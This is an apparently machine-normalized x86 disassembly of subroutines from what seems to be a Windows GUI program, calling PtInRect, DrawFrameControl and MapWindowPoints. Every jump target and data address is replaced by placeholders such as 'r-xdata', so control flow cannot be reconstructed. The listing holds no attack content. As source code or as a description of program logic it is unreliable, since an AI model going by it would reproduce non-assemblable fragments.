mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_440bd8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43ac9c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43ac60
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412ce0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440c6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_440bd8
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44022c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_440478
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44022c
call sub_4409ac
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_440cf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404050
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_40469c
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_440d3c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_440f34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_44140c
mov eax [ ebp - 0x8 ]
call sub_440408
xor edx edx
push ebp
push sub_440f17
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440f1e
mov eax [ ebp - 0x8 ]
call sub_44040c
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fbe0
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_440cf4
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403490
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43ff00
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_440cf4
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_4376cc
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_4384c4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403294
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_440f44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412d08
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e904
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440f9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41dea4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41e600
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41e5a0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41e5a0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41dea4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41e5a0
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41e5a0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_441024
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_440f44
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_440f9c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_440f9c
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_440f44
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_440f9c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_440f9c
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_441100
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441256
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_436388
mov eax [ ebp - 0x4 ]
call sub_41e5d8
xor eax eax
push ebp
push sub_441239
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e984
xor eax eax
push ebp
push sub_44121c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_43ac9c
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441223
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e984
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_43ac60
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43714c
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_441264
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_43ca9c
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4371f4
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_4371b0
mov ecx eax
xor edx edx
xor eax eax
call sub_412d08
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_43df6c
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412d30
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_4413d8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4413d8
pop ecx
mov eax ebx
call sub_403294
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4413d8
pop ecx
sub_44140c
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_4413d8
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403294
xor eax eax
mov [ esi + 0x64 ] eax
sub_441468
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440478
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_4414a4
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4414a4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_441711
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov edx [ ebp - 0x8 ]
pop eax
call sub_404318
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax [ ebx + 0x14 ]
call sub_43fc04
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov edx [ ebp - 0x10 ]
pop eax
call sub_404318
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403294
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441718
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404074
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_43ffb4
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_44012c
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_440168
mov eax [ ebx + 0x18 ]
call sub_43ffb4
mov [ edx + 0x18 ] eax
push esi
push sub_441cb4
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4404e0
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_440168
mov eax [ esi + 0x64 ]
call sub_44012c
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403294
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_441c8c
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403294
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_43fcb0
mov edx eax
mov eax edi
call sub_440154
mov eax edi
call sub_43ffb4
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_441cb4
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4404e0
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_441cb4
mov edx [ eax + 0x14 ]
mov eax esi
call sub_4404e0
mov eax [ ebx + 0x14 ]
call sub_403294
mov eax edi
call sub_403294
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_441720
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_43ca9c
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407ca0
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_440154
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43ca08
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_440154
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_441b3c
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_441cb4
xor edx edx
mov eax edi
call sub_4404e0
sub_4417fc
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44012c
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a84
mov edx eax
mov eax ebx
call sub_440154
sub_441838
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_4418a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404310
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4418aa
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4418b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44195f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43febc
mov eax [ ebp - 0x8 ]
call sub_441838
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_4418b0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441966
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_4418b0
pop ecx
sub_44196c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_441aa5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_441a54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43ca08
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441a5b
mov eax [ ebp - 0x10 ]
call sub_403294
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_441838
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43ca1c
mov edi eax
cmp [ edi + 0x57 ] 0x0
